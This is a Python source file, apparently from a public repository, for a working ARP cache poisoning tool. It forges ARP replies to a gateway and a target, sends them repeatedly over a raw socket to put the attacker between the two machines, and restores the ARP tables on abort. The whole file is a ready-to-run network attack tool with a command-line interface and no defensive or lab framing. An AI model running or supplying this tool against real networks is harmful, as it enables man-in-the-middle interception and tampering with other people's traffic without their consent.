#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

"""
A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
"""

import argparse
import re
import time
from itertools import count
from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW


i = ' ' * 4  # Basic indentation level


class ARPPacket(object):
    def __init__(self, sender_hdwr: str, sender_proto: str,
                 target_hdwr: str, target_proto: str,
                 ethertype: bytes = b'\x08\x06',  # ARP Ethernet II
                 htype: bytes = b'\x00\x01',      # Ethernet
                 ptype: bytes = b'\x08\x00',      # IP
                 hlen: bytes = b'\x06',
                 plen: bytes = b'\x04',
                 oper: bytes = b'\x00\x02'):      # ARP REPLY message
        self.sender_hdwr = sender_hdwr
        self.sender_proto = sender_proto
        self.target_hdwr = target_hdwr
        self.target_proto = target_proto
        self.ethertype = ethertype
        self.htype = htype
        self.ptype = ptype
        self.hlen = hlen
        self.plen = plen
        self.oper = oper
        self.contents = None
        self.build_packet()

    def __set_hardware_addrs_as_bytes(self, *args):
        def hdwr_to_hex(mac):
            return b''.join(bytes.fromhex(octet) for octet in
                            re.split('[:-]', mac))
        for hdwr, hdwr_addr in zip(('b_sender_hdwr', 'b_target_hdwr'), args):
            setattr(self, hdwr, hdwr_to_hex(hdwr_addr))

    def __set_protocol_addrs_as_bytes(self, *args):
        for proto, proto_addr in zip(('b_sender_proto', 'b_target_proto'), args):
            setattr(self, proto, inet_aton(proto_addr))

    def __build_ethernet_frame(self):  # IEEE 802.3
        self.ethernet_frame = self.b_target_hdwr \
                              + self.b_sender_hdwr \
                              + self.ethertype

    def __build_arp_payload(self, *args):
        self.arp_payload = b''.join(args) \
                           + self.b_sender_hdwr \
                           + self.b_sender_proto \
                           + self.b_target_hdwr \
                           + self.b_target_proto

    def build_packet(self):  # IETF RFC 826
        self.__set_hardware_addrs_as_bytes(self.sender_hdwr, self.target_hdwr)
        self.__set_protocol_addrs_as_bytes(self.sender_proto, self.target_proto)
        self.__build_ethernet_frame()
        self.__build_arp_payload(self.htype, self.ptype, self.hlen, self.plen,
                                 self.oper)
        self.contents = b''.join((self.ethernet_frame, self.arp_payload))


class AttackPackets(object):
    def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
                 gateway_ip: str, target_ip: str):
        self.__set_ip_addresses_to_bytes(gateway_ip, target_ip)
        self.__set_mac_addresses_to_bytes(attacker_mac, gateway_mac, target_mac)
        self.__build_ethernet_frames()
        self.__build_arp_header()
        self.__build_packet_to_gateway()
        self.__build_packet_to_target()

    def __iter__(self):
        yield from (self.packet_to_gateway, self.packet_to_target)

    def __set_ip_addresses_to_bytes(self, *args):
        for ip_name, ip_address in zip(('gateway_ip', 'target_ip'), args):
            setattr(self, ip_name, inet_aton(ip_address))

    def __set_mac_addresses_to_bytes(self, *args):
        def mac_to_hex(mac):
            return b''.join(bytes.fromhex(octet) for octet in
                            re.split('[:-]', mac))
        for mac_name, mac_address in zip(('attacker_mac', 'gateway_mac',
                                          'target_mac'), args):
            setattr(self, mac_name, mac_to_hex(mac_address))

    def __build_ethernet_frames(self):  # Defined by IEEE 802.3
        dest_and_protocol = self.attacker_mac + b'\x08\x06'
        self.eth_frame_to_gateway = self.gateway_mac + dest_and_protocol
        self.eth_frame_to_target = self.target_mac + dest_and_protocol

    def __build_arp_header(self):       # Defined by IETF RFC 826
        hardware_address = b'\x00\x01'  # '\x00\x01' = Ethernet
        protocol_address = b'\x08\x00'  # '\x08\x00' = IP
        hardware_address_len = b'\x06'
        protocol_address_len = b'\x04'
        opcode = b'\x00\x02'            # '\x00\x02' = REPLY message
        self.arp_header = b''.join((hardware_address, protocol_address,
                                    hardware_address_len, protocol_address_len,
                                    opcode))

    def __build_packet_to_gateway(self, restore: bool = False):
        source_mac_addr = self.attacker_mac if restore is False \
            else self.target_mac
        self.packet_to_gateway = b''.join((self.eth_frame_to_gateway,
                                           self.arp_header,
                                           source_mac_addr, self.target_ip,
                                           self.gateway_mac, self.gateway_ip))

    def __build_packet_to_target(self, restore: bool = False):
        source_mac_addr = self.attacker_mac if restore is False \
            else self.gateway_mac
        self.packet_to_target = b''.join((self.eth_frame_to_target,
                                          self.arp_header,
                                          source_mac_addr, self.gateway_ip,
                                          self.target_mac, self.target_ip))

    def restore_arp_tables(self, option: bool = True):
        self.__build_packet_to_gateway(option)
        self.__build_packet_to_target(option)


class Spoofer(object):
    def __init__(self, interface: str, *, arp_packets):
        self.interface = interface
        self.arp_packets = arp_packets

    def execute(self, *, max_packets: int, interval: float):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.interface, htons(0x0800)))
            for packet_count in count(start=1):
                for packet in self.arp_packets:
                    sock.send(packet)
                time.sleep(interval)
                if packet_count == max_packets:
                    break


def spoof(args):
    """Controls the flow of execution of the ARP Spoofer tool."""
    packets = AttackPackets(attacker_mac=args.attackermac, gateway_mac=args.gatemac,
                            target_mac=args.targetmac, gateway_ip=args.gateip,
                            target_ip=args.targetip)
    spoofer = Spoofer(interface=args.interface, arp_packets=packets)

    current_time = time.strftime("%H:%M:%S", time.localtime())
    print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
          'abort.'.format(current_time))
    try:
        spoofer.execute(max_packets=args.maxpackets, interval=args.interval)
    except KeyboardInterrupt:
        print('[!] Aborting ARP Spoofing attack...')
        print('{0}[+] Attempting to restore target ARP tables to their '
              'previous states...'.format(i))
        packets.restore_arp_tables()
        spoofer.execute(max_packets=20, interval=1)
        raise SystemExit('{0}[+] ARP Spoofing attack terminated.'.format(i))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to '
                             'send/receive packets from.')
    parser.add_argument('--attackermac', type=str, required=True, metavar='MAC',
                        help='MAC address of the Network Interface Controller '
                             '(NIC) used by the attacker.')
    parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('--interval', type=float, default=0.5,
                        metavar='SECONDS',
                        help='Time to wait between transmission of each set of '
                             'ARP Cache Poisoning attack packets (set to 0.5 '
                             'seconds by default).')
    parser.add_argument('--maxpackets', type=int, default=0, metavar='PACKETS',
                        help='Maximum number of packets to transmit to the '
                             'targets during the attack (set to 0 to send an '
                             'infinite number of packets by default).')
    cli_args = parser.parse_args()
    spoof(cli_args)
